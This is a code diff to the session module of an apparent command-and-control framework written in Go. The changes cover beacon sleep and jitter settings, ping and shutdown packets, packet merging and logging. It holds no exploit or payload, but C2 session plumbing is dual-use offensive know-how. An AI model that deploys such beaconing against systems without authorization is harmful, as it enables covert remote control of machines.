@@ -1,16 +1,27 @@
 package c2
 
 import (
-	"bytes"
 	"context"
 	"errors"
+	"fmt"
 	"math"
 	"math/rand"
+	"net"
 	"time"
 
+	"github.com/iDigitalFlame/logx/logx"
+	"github.com/iDigitalFlame/xmt/xmt/c2/transform"
+	"github.com/iDigitalFlame/xmt/xmt/c2/wrapper"
 	"github.com/iDigitalFlame/xmt/xmt/com"
+	"github.com/iDigitalFlame/xmt/xmt/data"
 	"github.com/iDigitalFlame/xmt/xmt/device"
-	"github.com/iDigitalFlame/xmt/xmt/util"
+)
+
+const (
+	jitterMin int8 = 0
+	jitterMax int8 = 100
+
+	packetMaxMerge uint16 = 64
 )
 
 var (
@@ -18,8 +29,9 @@ var (
 	// Session is full.
 	ErrFullBuffer = errors.New("cannot add a Packet to a full send buffer")
 
-	jitterMin int8
-	jitterMax int8 = 100
+	// PacketMultiMaxSize is the limit of size that a auto generated
+	// multi packet can be before being truncated.
+	PacketMultiMaxSize = data.DataLimitMedium
 )
 
 // Session is a struct that represents a connection between the client and
@@ -49,9 +61,9 @@ type Session struct {
 	cancel     context.CancelFunc
 	parent     *Handle
 	proxies    map[uint32]*proxyClient
-	connect    func(string) (Connection, error)
-	wrapper    Wrapper
-	transform  Transform
+	connect    func(string) (net.Conn, error)
+	wrapper    wrapper.Wrapper
+	transform  transform.Transform
 	controller *Server
 }
 
@@ -132,7 +144,11 @@ func (s *Session) listen() {
 		if err != nil {
 			s.controller.Log.Warning("[%s] Received an error attempting to read from \"%s\"! (%s)", s.ID, s.server, err.Error())
 			c.Close()
-			continue
+			if s.errors > 0 {
+				s.errors--
+				continue
+			}
+			break
 		}
 		if p == nil || p.IsEmpty() {
 			s.controller.Log.Warning("[%s] Received an empty packet from \"%s\"!", s.ID, s.server)
@@ -144,6 +160,7 @@ func (s *Session) listen() {
 			c.Close()
 			continue
 		}
+		s.errors = maxErrors
 		c.Close()
 	}
 	s.controller.events <- &callback{
@@ -158,7 +175,7 @@ func (s *Session) listen() {
 // shutdown and release resources. This will not close the session until
 // the client acknowledges and sends the response to this packet.
 func (s *Session) Shutdown() {
-	s.WritePacket(&com.Packet{ID: MsgShutdown, Device: s.Device.ID, Job: 1})
+	s.send <- &com.Packet{ID: MsgShutdown, Device: s.Device.ID, Job: 1}
 }
 
 // Close stops the listening thread from this Session and
@@ -181,6 +198,15 @@ func (s *Session) Close() error {
 	return nil
 }
 
+// Log returns an active handle to log
+// Session related information.
+func (s *Session) Log() logx.Log {
+	if s.parent != nil {
+		return s.parent.controller.Log
+	}
+	return s.controller.Log
+}
+
 // IsProxy returns true when a Proxy has been attached to this Session and is active.
 func (s *Session) IsProxy() bool {
 	return s.proxies != nil && len(s.proxies) > 0
@@ -188,7 +214,7 @@ func (s *Session) IsProxy() bool {
 
 // String returns the ID of this Session.
 func (s *Session) String() string {
-	return s.ID.FullString()
+	return fmt.Sprintf("[%s] %s", s.ID.FullString(), s.Last.Format(time.RFC1123))
 }
 
 // IsActive returns true if this Session is
@@ -203,19 +229,6 @@ func (s *Session) IsClient() bool {
 	return s.parent == nil
 }
 
-// Times sets the wake/sleep values in the form of
-// Sleep (in seconds) and JItter.  If the values are
-// -1 or outside the standard range, the given values will
-// be ignored.
-func (s *Session) Times(t, j int) {
-	if t > 0 {
-		s.Sleep = time.Second * time.Duration(t)
-	}
-	if int8(j) >= jitterMin && int8(j) < jitterMax {
-		s.Jitter = int8(j)
-	}
-}
-
 // ReadPacket attempts to grab a Packet from the receiving
 // buffer. This functions nil if there the buffer is empty.
 func (s *Session) ReadPacket() *com.Packet {
@@ -226,13 +239,44 @@ func (s *Session) ReadPacket() *com.Packet {
 	}
 	return nil
 }
-func (s *Session) peek(i Connection) error {
-	select {
-	case <-s.ctx.Done():
-		return s.ctx.Err()
-	default:
+
+// WriteWait adds the supplied Packet into the stack to be sent to the server
+// on next wake. This call is asynchronous and returns immediately. Unlike 'WritePacket'
+// this function does NOT return an error and will wait for the buffer to have open spots.
+func (s *Session) WriteWait(p *com.Packet) {
+	s.send <- p
+}
+
+// Context returns the current Session's context.
+// This function can be useful for canceling running
+// processes when this session closes.
+func (s *Session) Context() context.Context {
+	return s.ctx
+}
+
+// Time sets the wake/sleep values in the form of
+// Sleep and Jitter.  If the values are -1 or outside
+// the standard range, the given values will be ignored.
+func (s *Session) Time(t time.Duration, j int) {
+	if t > 0 {
+		s.Sleep = t
 	}
-	v, err := next(s.send, s.Device.ID)
+	if int8(j) >= jitterMin && int8(j) < jitterMax {
+		s.Jitter = int8(j)
+	}
+	if s.parent != nil {
+		n := &com.Packet{ID: MsgProfile, Device: s.Device.ID}
+		n.WriteInt8(s.Jitter)
+		n.WriteUint64(uint64(s.Sleep))
+		n.Close()
+		s.send <- n
+	}
+}
+func (s *Session) peek(i net.Conn) error {
+	if len(s.ctx.Done()) > 0 {
+		return s.ctx.Err()
+	}
+	v, err := next(s.send, s.Device.ID, false)
 	if err != nil {
 		return err
 	}
@@ -253,25 +297,22 @@ func (s *Session) WritePacket(p *com.Packet) error {
 	s.send <- p
 	return nil
 }
-func next(c chan *com.Packet, i device.ID) (*com.Packet, error) {
+func next(c chan *com.Packet, i device.ID, s bool) (*com.Packet, error) {
 	if len(c) == 0 {
-		return &com.Packet{ID: MsgSleep, Device: i}, nil
+		if s {
+			return &com.Packet{ID: MsgSleep, Device: i}, nil
+		}
+		return &com.Packet{ID: MsgPing, Device: i}, nil
 	}
 	var p *com.Packet
 	if len(c) == 1 {
 		p = <-c
-		if p.Job == 0 {
-			p.Job = uint16(util.Rand.Uint32())
-		}
-		if p.Device == nil {
-			p.Device = i
-			return p, nil
-		} else if bytes.Equal(p.Device, i) {
+		if p.Check(i) {
 			return p, nil
 		}
 	}
-	m := &com.Packet{ID: MsgMultiple, Device: i}
-	var t int
+	m := &com.Packet{ID: MsgMultiple, Device: i, Flags: com.FlagMulti}
+	var t uint16
 	var x, a bool
 	if p != nil {
 		t++
@@ -279,39 +320,32 @@ func next(c chan *com.Packet, i device.ID) (*com.Packet, error) {
 		if err := p.MarshalStream(m); err != nil {
 			return nil, err
 		}
-		p.ResetFull()
+		p.Clear()
 	}
-	for ; len(c) > 0 && t < com.MaxAutoMultiSize; t++ {
+	for ; len(c) > 0 && t < packetMaxMerge && m.Size() < PacketMultiMaxSize; t++ {
 		p = <-c
-		if p.Job == 0 {
-			p.Job = uint16(util.Rand.Uint32())
-		}
-		if p.Device == nil {
+		if p.Check(i) {
 			a = true
-			p.Device = i
-		} else if !bytes.Equal(p.Device, i) {
-			x = true
 		} else {
-			a = true
+			x = true
 		}
 		if err := p.MarshalStream(m); err != nil {
 			return nil, err
 		}
-		p.ResetFull()
+		p.Clear()
 	}
 	if !a {
 		t++
 		x = true
-		p = &com.Packet{ID: MsgSleep, Device: i}
+		p = &com.Packet{ID: MsgPing, Device: i}
 		if err := p.MarshalStream(m); err != nil {
 			return nil, err
 		}
 	}
 	m.Close()
-	m.Flags |= com.FlagMulti
 	if x {
 		m.Flags |= com.FlagMultiDevice
 	}
-	m.Flags.SetFragTotal(uint16(t))
+	m.Flags.SetFragTotal(t)
 	return m, nil
 }
